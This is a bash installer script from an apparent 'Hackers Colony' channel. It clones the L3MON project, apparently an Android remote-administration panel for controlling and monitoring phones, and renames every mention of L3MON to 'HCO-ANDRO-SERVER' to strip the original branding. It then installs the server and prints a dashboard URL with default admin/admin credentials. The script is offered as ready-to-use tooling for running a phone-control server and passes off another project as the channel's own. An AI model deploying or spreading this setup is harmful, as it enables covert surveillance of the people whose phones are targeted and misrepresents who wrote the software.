#!/bin/bash

# Screen clear karein pehle
clear

# Professional Header - Sabse Pehle Welcome Message
echo -e "\e[1;32m"
echo "──────────────────────────────────────────────────────────"
echo "       🔥 WELCOME TO HACKERS COLONY ANDROID SERVER 🔥     "
echo "──────────────────────────────────────────────────────────"
echo -e "\e[0m"

echo -e "\e[1;36m  🛠️  Developer : Azhar (HCO Team)"
echo -e "\e[1;36m  📢 Channel   : Hackers Colony Official"
echo -e "\e[1;36m  🚀 Version   : 1.0 (Elite Edition)"
echo -e "\e[0m"

echo -e "\e[1;34m  🌐 YouTube   : \e[4mhttps://youtube.com/@hackers_colony_tech\e[0m"
echo -e "\e[1;34m  💬 WhatsApp  : \e[4mhttps://wa.me/8420611159\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"

echo -e "\n\e[1;33m[*] Initializing HCO-ANDRO-SERVER System...\e[0m"

# Dependencies check and install
apt update && apt upgrade -y
pkg install nodejs git python openjdk-17 -y
npm install pm2 -g

# Core Setup
echo -e "\e[1;34m[*] Building Private Server Engine...\e[0m"
git clone https://github.com/D3VL/L3MON.git .core_engine > /dev/null 2>&1
mv .core_engine/* .
rm -rf .core_engine

# Branding Cleanup (L3MON ka naam nishan mita dein)
grep -rl "L3MON" . | xargs sed -i 's/L3MON/HCO-ANDRO-SERVER/g' > /dev/null 2>&1
grep -rl "l3mon" . | xargs sed -i 's/l3mon/hco-andro/g' > /dev/null 2>&1

# Server Modules
echo -e "\e[1;34m[*] Configuring Database Modules...\e[0m"
cd server
npm install > /dev/null 2>&1

# Final Success Message
clear
echo -e "\e[1;32m"
echo "──────────────────────────────────────────────────────────"
echo "         ✅ HCO-ANDRO-SERVER BY AZHAR IS READY!          "
echo "──────────────────────────────────────────────────────────"
echo -e "\e[0m"
echo -e "\e[1;33m  🚀 To Start Dashboard: \e[1;37mpm2 start index.js\e[0m"
echo -e "\e[1;33m  🌐 Access URL        : \e[1;37mhttp://localhost:22533\e[0m"
echo -e "\e[1;33m  🔑 Default Login     : \e[1;37madmin / admin\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"
